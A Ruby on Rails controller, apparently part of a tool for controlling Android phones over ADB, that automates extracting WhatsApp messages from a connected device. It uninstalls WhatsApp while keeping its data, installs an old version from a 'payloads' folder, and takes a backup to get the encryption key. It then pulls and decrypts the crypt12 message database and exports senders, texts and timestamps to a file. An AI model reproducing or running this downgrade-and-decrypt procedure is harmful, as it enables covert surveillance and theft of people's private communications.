class MessagingAppsDumpsController < InheritedResources::Base

  def export_database(filePath)
    begin
        require 'sqlite3'
        db = SQLite3::Database.open "app\\assets\\images\\files\\whatsapp\\msgstore.db"
        stm = db.prepare "SELECT _id,key_remote_jid,data,timestamp FROM messages;" 
        rs = stm.execute 
        File.open(filePath, 'w') do |file|
            rs.each do |row|
                file.write(row.join("---") + "\n")
            end
        end
    rescue SQLite3::Exception => e 
        puts "Exception occurred"
        puts e
    ensure
        stm.close if stm
        db.close if db
end
end



def dump_whatsapp_data
    require 'minitar'
    #uninstall newest version
    #system("tools\\platform-tools\\adb.exe -s 192.168.100.33 shell pm uninstall -k com.whatsapp")
    run_adb_command('shell pm uninstall -k com.whatsapp')
    #install old version
    #system("tools\\platform-tools\\adb.exe -s 192.168.100.33 install payloads\\WhatsApp-v2.11.431-AndroidBucket.com.apk")
    run_adb_command('install payloads\\WhatsApp-v2.11.431-AndroidBucket.com.apk')
    #backup whatsapp
    #system("tools\\platform-tools\\adb.exe -s 192.168.100.33 backup -apk com.whatsapp -f app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab")
    run_adb_command('backup -apk com.whatsapp -f app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab')
    #adb shell input keyevent 82
    #adb shell input tap 521 1130
    #convert ab backup file to tar
    system("java -jar tools\\android-backup-extractor\\android-backup-extractor-20180521-bin\\abe.jar unpack app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab.tar")
    #untar the tar file
    Minitar.unpack('app\\assets\\images\\files\\whatsapp\\whatsapp_backup.ab.tar', 'app\assets\images\files\whatsapp\whatsapp_backup')
    #pull the db file
    #system("tools\\platform-tools\\adb.exe -s 192.168.100.33 pull /sdcard/WhatsApp/Databases/msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12") 
    run_adb_command('pull /sdcard/WhatsApp/Databases/msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12')
    #decrypt it using the key
    system("java -jar tools\\crypt12-decrypt\\master\\decrypt12.jar app\\assets\\images\\files\\whatsapp\\whatsapp_backup\\apps\\com.whatsapp\\f\\key app\\assets\\images\\files\\whatsapp\\msgstore.db.crypt12 app\\assets\\images\\files\\whatsapp\\msgstore.db")
    #export the database to a txt file

    downloadTimeout=params[:copy_timeout].to_i
    @smartphone = Smartphone.find(params[:smartphone_id])
    currentTime = DateTime.now
    currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
    @fileName= "whatsapp_dump_" + currentTimeFormat + '.txt'
    fullPath="app\\assets\\images\\files\\whatsapp\\" + @fileName
    export_database(fullPath)

    isOperationSuccessful=false
    1.upto(downloadTimeout) do |n|
        if File.file?(fullPath)
            newDump=MessagingAppsDump.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:app_name => "WhatsApp", :filename => @fileName, :smartphone_id => @smartphone.id)
            newDump.save!
            isOperationSuccessful = true
            break
        end 
    end
    commandOutput=["Operation Failed"] if not isOperationSuccessful

    respond_to do |format|
      format.js { render "dump_whatsapp_data", :locals => {:commandOutput => commandOutput, :fileName => @fileName }  }
    end
end

  private

    def messaging_apps_dump_params
      params.require(:messaging_apps_dump).permit(:date, :app_name, :filename, :smartphone_id)
    end

end